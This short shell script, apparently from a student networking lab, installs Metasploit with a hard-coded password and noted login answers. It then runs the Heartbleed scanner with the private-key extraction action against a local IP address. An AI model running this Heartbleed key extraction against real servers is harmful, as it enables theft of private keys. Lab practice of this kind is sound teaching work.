# installer metasploit

curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
  chmod 755 msfinstall && \
  ./msfinstall -i -p "vitrygtr"

ip="192.168.1.173"
# ip="192.168.1.33"

# lancer metasploit
# /opt/metasploit-framework/bin/msfconsole

## répondre yes
## etudiant 
## vitrygtr


## setting payload
# use auxiliary/scanner/ssl/openssl_heartbleed
# set VERBOSE true
# set RHOSTS $ip
# exploit


/opt/metasploit-framework/bin/msfconsole -q -x " use auxiliary/scanner/ssl/openssl_heartbleed ; set VERBOSE true ; set RHOSTS $ip ; set action KEYS ;  exploit"